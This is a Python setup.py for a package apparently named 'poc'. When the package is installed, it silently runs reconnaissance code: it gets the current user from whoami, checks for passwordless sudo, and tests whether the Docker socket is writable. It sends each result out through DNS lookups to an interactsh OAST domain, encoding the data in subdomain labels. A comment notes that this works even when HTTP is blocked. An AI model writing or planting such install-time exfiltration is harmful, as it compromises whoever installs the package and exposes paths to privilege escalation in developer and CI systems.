   
  from setuptools import setup                                                                                                                               
  import subprocess, socket                                       

  # DNS exfil — works even if HTTP is fully blocked                                                                                                          
  # each lookup encodes data in the subdomain
  def dns_send(label, interactsh_domain):                                                                                                                    
      try:                                                                                                                                                   
          socket.getaddrinfo(f"{label}.{interactsh_domain}", 80)                                                                                             
      except Exception:                                                                                                                                      
          pass                                                    
                                                                                                                                                             
  domain = "gjgoqfppmqukjncmpkbjmk8pb0r26rwma.oast.fun"  # just the domain, no http://                                                                                           
   
  # confirm execution                                                                                                                                        
  dns_send("ping", domain)                                        

  # send whoami as subdomain                                                                                                                                 
  try:
      who = subprocess.check_output(["whoami"], text=True).strip()                                                                                           
      dns_send(f"who-{who}", domain)                              
  except Exception:                                                                                                                                          
      dns_send("who-failed", domain)
                                                                                                                                                             
  # send sudo check result                                                                                                                                   
  try:
      r = subprocess.run(["sudo", "-n", "-l"], capture_output=True, text=True, timeout=5)                                                                    
      if "NOPASSWD" in r.stdout:                                  
          dns_send("sudo-nopasswd-YES", domain)                                                                                                              
      elif r.stdout:
          dns_send("sudo-limited", domain)                                                                                                                   
      else:                                                       
          dns_send("sudo-denied", domain)                                                                                                                    
  except Exception as e:                                          
      dns_send("sudo-err", domain)                                                                                                                           
   
  # docker socket check                                                                                                                                      
  import os                                                       
  if os.path.exists("/var/run/docker.sock"):
      writable = os.access("/var/run/docker.sock", os.W_OK)                                                                                                  
      dns_send(f"docker-sock-writable-{writable}", domain)
  else:                                                                                                                                                      
      dns_send("docker-sock-absent", domain)                      
                                                                                                                                                             
  setup(name="poc", install_requires=["requests"])
